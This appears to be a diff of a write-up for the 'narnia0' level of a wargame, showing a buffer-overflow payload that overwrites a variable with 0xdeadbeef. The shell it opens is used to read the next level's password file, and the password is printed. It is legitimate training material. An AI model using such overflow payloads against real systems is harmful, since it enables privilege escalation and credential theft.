@@ -81,7 +81,7 @@ It works! We were able to modify `val`. Now lets try giving the program what it 
 
 ```bash
 narnia0@narnia:~$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | /narnia/narnia0
-Correct val's value from 0x41414141 -> 0xdeadbeef!
+Correct val\'s value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
 ```
@@ -92,7 +92,7 @@ Now that we have privilege escilation lets get the password for narnia1 from /et
 
 ```bash
 narnia0@narnia:~$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0
-Correct val's value from 0x41414141 -> 0xdeadbeef!
+Correct val\'s value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
 efeidiedae       # password for narnia1
@@ -104,13 +104,13 @@ Alternatively, print the string, and copy & paste it to get the the narnia1 shel
 narnia0@narnia:/narnia$ (echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\xaf';cat)
 AAAAAAAAAAAAAAAAAAAAﾭޯ                             # copy this to paste it
 narnia0@narnia:/narnia$ ./narnia0
-Correct val's value from 0x41414141 -> 0xdeadbeef!
+Correct val\'s value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: AAAAAAAAAAAAAAAAAAAAﾭޯ 
 buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef                                   # success! 
 $ whoami                                          
 narnia1                                           
 $ cat /etc/narnia_pass/narnia1
-efeidiedae
+efeidiedae                                        # password for narnia1
 $
 ```
